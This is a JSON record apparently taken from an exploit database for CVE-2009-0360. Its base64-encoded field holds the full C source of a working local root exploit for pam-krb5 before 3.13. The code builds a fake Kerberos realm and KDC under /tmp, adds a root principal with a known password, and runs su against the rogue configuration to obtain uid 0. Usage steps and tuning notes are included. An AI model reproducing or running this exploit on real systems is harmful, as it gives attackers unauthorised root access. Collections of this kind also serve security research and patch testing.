{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIGN2ZS0yMDA5LTAzNjAuYw0KICoNCiAqIHBhbS1rcmI1IDwgMy4xMyBsb2NhbCBwcml2aWxlZ2UgZXNjYWxhdGlvbg0KICogSm9uIE9iZXJoZWlkZSA8am9uQG9iZXJoZWlkZS5vcmc+DQogKiBodHRwOi8vam9uLm9iZXJoZWlkZS5vcmcNCiAqDQogKiBJbmZvcm1hdGlvbjoNCiAqDQogKiAgIGh0dHA6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAwOS0wMzYwDQogKg0KICogICBwYW0ta3JiNSBiZWZvcmUgMy4xMywgd2hlbiBsaW5rZWQgYWdhaW5zdCBNSVQgS2VyYmVyb3MsIGRvZXMgbm90IHByb3Blcmx5IA0KICogICBpbml0aWFsaXplIHRoZSBLZXJiZXJvcyBsaWJyYXJpZXMgZm9yIHNldHVpZCB1c2UsIHdoaWNoIGFsbG93cyBsb2NhbCANCiAqICAgdXNlcnMgdG8gZ2FpbiBwcml2aWxlZ2VzIGJ5IHBvaW50aW5nIGFuIGVudmlyb25tZW50IHZhcmlhYmxlIHRvIGEgDQogKiAgIG1vZGlmaWVkIEtlcmJlcm9zIGNvbmZpZ3VyYXRpb24gZmlsZSwgYW5kIHRoZW4gbGF1bmNoaW5nIGEgUEFNLWJhc2VkIA0KICogICBzZXR1aWQgYXBwbGljYXRpb24uIA0KICogICANCiAqIFVzYWdlOg0KICoNCiAqICAgJCBnY2MgY3ZlLTIwMDktMDM2MC5jIC1vIGN2ZS0yMDA5LTAzNjANCiAqICAgJCAuL2N2ZS0yMDA5LTAzNjANCiAqICAgWytdIGNyZWF0aW5nIGtyYjUuY29uZg0KICogICBbK10gY3JlYXRpbmcga2RjLmNvbmYNCiAqICAgWytdIGNyZWF0aW5nIGtlcmJlcm9zIGRhdGFiYXNlDQogKiAgIExvYWRpbmcgcmFuZG9tIGRhdGENCiAqICAgSW5pdGlhbGl6aW5nIGRhdGFiYXNlICcvdG1wL2N2ZS0yMDA5LTAzNjAvcHJpbmNpcGFsJyBmb3IgcmVhbG0gJ1RFU1QuQ09NJywNCiAqICAgbWFzdGVyIGtleSBuYW1lICdLL01AVEVTVC5DT00nDQogKiAgIFsrXSBhZGRpbmcgcHJpbmNpcGFsIHJvb3RAVEVTVC5DT00NCiAqICAgQXV0aGVudGljYXRpbmcgYXMgcHJpbmNpcGFsIHJvb3RAVEVTVC5DT00gd2l0aCBwYXNzd29yZC4NCiAqICAgRW50ZXIgS0RDIGRhdGFiYXNlIG1hc3RlciBrZXk6IA0KICogICBXQVJOSU5HOiBubyBwb2xpY3kgc3BlY2lmaWVkIGZvciByb290QFRFU1QuQ09NOyBkZWZhdWx0aW5nIHRvIG5vIHBvbGljeQ0KICogICBQcmluY2lwYWwgInJvb3RAVEVTVC5DT00iIGNyZWF0ZWQuDQogKiAgIFsrXSBsYXVuY2hpbmcga3JiNWtkYyBvbiAxNDEuMjEyLjExMC4xNjM6NjY2Ng0KICogICBbK10gbGF1bmNoaW5nIHN1IHdpdGggZmFrZSBLREMgY29uZmlndXJhdGlvbg0KICogICBbK10gZW50ZXIgInJvb3QiIGF0IHRoZSBwYXNzd29yZCBwcm9tcHQNCiAqICAgUGFzc3dvcmQ6IA0KICogICAjIGlkDQogKiAgIHVpZD0wKHJvb3QpIGdpZD0wKHJvb3QpIC4uLg0KICoNCiAqIE5vdGVzOg0KICoNCiAqICAgVGhpcyBleHBsb2l0IHdpbGwgcmVzdWx0IGluIGxvY2FsIHByaXZpbGVnZSBlc2NhbGF0aW9uIG9uIGhvc3RzIHRoYXQgdXNlIA0KICogICB0aGUgcGFtLWtyYjUgbW9kdWxlIGZvciBzdSBhdXRoZW50aWNhdGlvbi4gIENoZWNrIHRoZSBzdSBhbmQgc3lzdGVtLWF1dGgNCiAqICAgUEFNIGNvbmZpZ3VyYXRpb24gZmlsZXMgaW4gL2V0Yy9wYW0uZCB0byBkZXRlcm1pbmUgaWYgcGFtLWtyYjUgaXMgaW4gdXNlLg0KICogICBTb21lIGN1c3RvbWl6YXRpb24gb2YgdGhlIGRlZmluZWQgY29uc3RhbnRzIGFuZCBwYXRocyBtYXkgYmUgbmVjZXNzYXJ5IA0KICogICBmb3IgeW91ciBlbnZpcm9ubWVudC4gIEJlIHN1cmUgdG8gc2V0IEZBS0VfS0RDX0hPU1QgdG8gdGhlIElQIGFkZHJlc3Mgb2YNCiAqICAgYW4gYWN0aXZlIG5vbi1sb29wYmFjayBpbnRlcmZhY2Ugb24gdGhlIHRhcmdldCBtYWNoaW5lLg0KICovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8c3lzL3N0YXQuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KDQojZGVmaW5lIFJFQUxNICJURVNULkNPTSINCiNkZWZpbmUgRkFLRV9LRENfSE9TVCAiMTQxLjIxMi4xMTAuMTYzIg0KI2RlZmluZSBGQUtFX0tEQ19QT1JUICI2NjY2Ig0KI2RlZmluZSBQUklOQ0lQQUxfTkFNRSAicm9vdCINCiNkZWZpbmUgUFJJTkNJUEFMX1BBU1MgInJvb3QiDQojZGVmaW5lIFRNUF9ESVIgIi90bXAvY3ZlLTIwMDktMDM2MCINCiNkZWZpbmUgS1VUSUxfUEFUSCAiL3Vzci9zYmluL2tkYjVfdXRpbCINCiNkZWZpbmUgS0FETUlOX1BBVEggIi91c3Ivc2Jpbi9rYWRtaW4ubG9jYWwiDQojZGVmaW5lIEtSQjVLRENfUEFUSCAiL3Vzci9zYmluL2tyYjVrZGMiDQoNCiNkZWZpbmUgS1JCNV9DT05GIFwNCiAgIltsaWJkZWZhdWx0c11cblx0ZGVmYXVsdF9yZWFsbSA9ICIgUkVBTE0gIlxuXG5bcmVhbG1zXVxuXHQiIFJFQUxNIFwNCiAgIiA9IHtcblx0XHRhZG1pbl9zZXJ2ZXIgPSAiIEZBS0VfS0RDX0hPU1QgIjoiIEZBS0VfS0RDX1BPUlQgIlxuXHRcdCIgXA0KICAiZGVmYXVsdF9kb21haW4gPSAiIFJFQUxNICJcblx0XHRrZGMgPSAiIEZBS0VfS0RDX0hPU1QgIjoiIEZBS0VfS0RDX1BPUlQgXA0KICAiXG5cdH1cblxuW2RvbWFpbl9yZWFsbV1cblx0LiIgUkVBTE0gIiA9ICIgUkVBTE0gIlxuXHQiIFJFQUxNICIgPSAiIFJFQUxNDQoNCiNkZWZpbmUgS0RDX0NPTkYgXA0KICAiW2tkY2RlZmF1bHRzXVxuXHRrZGNfcG9ydHMgPSAiIEZBS0VfS0RDX1BPUlQgIlxuXG5bcmVhbG1zXVxuXHQiIFJFQUxNIFwNCiAgIiA9IHtcblx0XHRkYXRhYmFzZV9uYW1lID0gIiBUTVBfRElSICIvcHJpbmNpcGFsXG5cdFx0YWRtaW5fa2V5dGFiID0gIiBcDQogICJGSUxFOiIgVE1QX0RJUiAiL2thZG01LmtleXRhYlxuXHRcdGFjbF9maWxlID0gIiBUTVBfRElSICIva2FkbTUuYWNsIiBcDQogICJcblx0XHRrZXlfc3Rhc2hfZmlsZSA9ICIgVE1QX0RJUiAiL3N0YXNoXG5cdFx0a2RjX3BvcnRzID0gIiBGQUtFX0tEQ19QT1JUIFwNCiAgIlxuXHRcdG1heF9saWZlID0gMTBoIDBtIDBzXG5cdFx0bWF4X3JlbmV3YWJsZV9saWZlID0gN2QgMGggMG0gMHNcblx0fSINCg0KaW50DQptYWluKHZvaWQpDQp7DQogICAgaW50IHJldDsNCiAgICBGSUxFICpmcDsNCiAgICBjaGFyICplcnI7DQoNCiAgICByZXQgPSBta2RpcihUTVBfRElSLCAwNzU1KTsNCiAgICBpZiAocmV0ID09IC0xICYmIGVycm5vICE9IEVFWElTVCkgew0KICAgICAgICBlcnIgPSAiY2Fubm90IGNyZWF0ZSBUTVBfRElSIjsNCiAgICAgICAgcHJpbnRmKCJbLV0gRXJyb3I6ICVzICglcylcbiIsIGVyciwgc3RyZXJyb3IoZXJybm8pKTsNCiAgICAgICAgcmV0dXJuIDE7DQogICAgfQ0KDQogICAgcHJpbnRmKCJbK10gY3JlYXRpbmcga3JiNS5jb25mXG4iKTsNCiAgICBzbGVlcCgxKTsNCg0KICAgIGZwID0gZm9wZW4oVE1QX0RJUiAiL2tyYjUuY29uZiIsICJ3Iik7DQogICAgaWYgKCFmcCkgew0KICAgICAgICBlcnIgPSAiY2Fubm90IG9wZW4ga3JiNS5jb25mIjsNCiAgICAgICAgcHJpbnRmKCJbLV0gRXJyb3I6ICVzICglcylcbiIsIGVyciwgc3RyZXJyb3IoZXJybm8pKTsNCiAgICAgICAgcmV0dXJuIDE7DQogICAgfQ0KICAgIGZ3cml0ZShLUkI1X0NPTkYsIDEsIHN0cmxlbihLUkI1X0NPTkYpLCBmcCk7DQogICAgZmNsb3NlKGZwKTsNCg0KICAgIHByaW50ZigiWytdIGNyZWF0aW5nIGtkYy5jb25mXG4iKTsNCiAgICBzbGVlcCgxKTsNCg0KICAgIGZwID0gZm9wZW4oVE1QX0RJUiAiL2tkYy5jb25mIiwgInciKTsNCiAgICBpZiAoIWZwKSB7DQogICAgICAgIGVyciA9ICJjYW5ub3Qgb3BlbiBrZGMuY29uZiI7DQogICAgICAgIHByaW50ZigiWy1dIEVycm9yOiAlcyAoJXMpXG4iLCBlcnIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICAgIHJldHVybiAxOw0KICAgIH0NCiAgICBmd3JpdGUoS0RDX0NPTkYsIDEsIHN0cmxlbihLRENfQ09ORiksIGZwKTsNCiAgICBmY2xvc2UoZnApOw0KDQogICAgY2hkaXIoVE1QX0RJUik7DQoNCiAgICBwcmludGYoIlsrXSBjcmVhdGluZyBrZXJiZXJvcyBkYXRhYmFzZVxuIik7DQogICAgc2xlZXAoMSk7DQoNCiAgICByZXQgPSBzeXN0ZW0oS1VUSUxfUEFUSCAiIGNyZWF0ZSAtZCAiIFRNUF9ESVIgIi9wcmluY2lwYWwgLXNmICIgVE1QX0RJUiBcDQogICAgICAgICAgICAgICAgICIvc3Rhc2ggLXIgIiBSRUFMTSAiIC1zIC1QIFwiXCIiKTsNCiAgICBpZiAoV0VYSVRTVEFUVVMocmV0KSAhPSAwKSB7DQogICAgICAgIGVyciA9ICJrZGI1X3V0aWwgY29tbWFuZCByZXR1cm5lZCBub24temVybyI7DQogICAgICAgIHByaW50ZigiWy1dIEVycm9yOiAlcywgY29udGludWluZyBleHBsb2l0IGFueXdheVxuIiwgZXJyKTsNCiAgICB9DQoNCiAgICBwcmludGYoIlsrXSBhZGRpbmcgcHJpbmNpcGFsICIgUFJJTkNJUEFMX05BTUUgIkAiIFJFQUxNICJcbiIpOw0KICAgIHNsZWVwKDEpOw0KDQogICAgcmV0ID0gc3lzdGVtKCJlY2hvIFwiXCIgfCAiIEtBRE1JTl9QQVRIICIgLW0gLXAgIiBQUklOQ0lQQUxfTkFNRSAiQCIgUkVBTE0gXA0KICAgICAgICAgICAgICAgICAiIC1kICIgVE1QX0RJUiAiL3ByaW5jaXBhbCAtciAiIFJFQUxNICIgLXEgXCJhZGRfcHJpbmNpcGFsICIgXA0KICAgICAgICAgICAgICAgICAiLXB3ICIgUFJJTkNJUEFMX1BBU1MgIiAiIFBSSU5DSVBBTF9OQU1FICJAIiBSRUFMTSAiXCIiKTsNCiAgICBpZiAoV0VYSVRTVEFUVVMocmV0KSAhPSAwKSB7DQogICAgICAgIGVyciA9ICJrYWRtaW4ubG9jYWwgY29tbWFuZCByZXR1cm5lZCBub24temVybyI7DQogICAgICAgIHByaW50ZigiWy1dIEVycm9yOiAlcywgY29udGludWluZyBleHBsb2l0IGFueXdheVxuIiwgZXJyKTsNCiAgICB9DQoNCiAgICBwcmludGYoIlsrXSBsYXVuY2hpbmcga3JiNWtkYyBvbiAiIEZBS0VfS0RDX0hPU1QgIjoiIEZBS0VfS0RDX1BPUlQgIlxuIik7DQogICAgc2xlZXAoMSk7DQoNCiAgICByZXQgPSBzeXN0ZW0oIktSQjVfS0RDX1BST0ZJTEU9XCIiIFRNUF9ESVIgIi9rZGMuY29uZlwiICIgS1JCNUtEQ19QQVRIIFwNCiAgICAgICAgICAgICAgICAgIiAtZCAiIFRNUF9ESVIgIi9wcmluY2lwYWwgLXIgIiBSRUFMTSk7DQogICAgaWYgKFdFWElUU1RBVFVTKHJldCkgIT0gMCkgew0KICAgICAgICBlcnIgPSAia3JiNWtkYyBjb21tYW5kIHJldHVybmVkIG5vbi16ZXJvIjsNCiAgICAgICAgcHJpbnRmKCJbLV0gRXJyb3I6ICVzLCBjb250aW51aW5nIGV4cGxvaXQgYW55d2F5XG4iLCBlcnIpOw0KICAgIH0NCg0KICAgIHByaW50ZigiWytdIGxhdW5jaGluZyBzdSB3aXRoIGZha2UgS0RDIGNvbmZpZ3VyYXRpb25cbiIpOw0KICAgIHNsZWVwKDEpOw0KICAgIHByaW50ZigiWytdIGVudGVyIFwiIiBQUklOQ0lQQUxfUEFTUyAiXCIgYXQgdGhlIHBhc3N3b3JkIHByb21wdFxuIik7DQogICAgc2xlZXAoMSk7DQoNCiAgICBzeXN0ZW0oIktSQjVfQ09ORklHPVwiIiBUTVBfRElSICIva3JiNS5jb25mXCIgc3UiKTsNCg0KICAgIHJldHVybiAwOw0KfQ0KDQovLyBtaWx3MHJtLmNvbSBbMjAwOS0wMy0yOV0=", 
    "filename": "platforms/linux/local/8303.c", 
    "id": "8303", 
    "cves": [
        "CVE-2009-0360"
    ]
}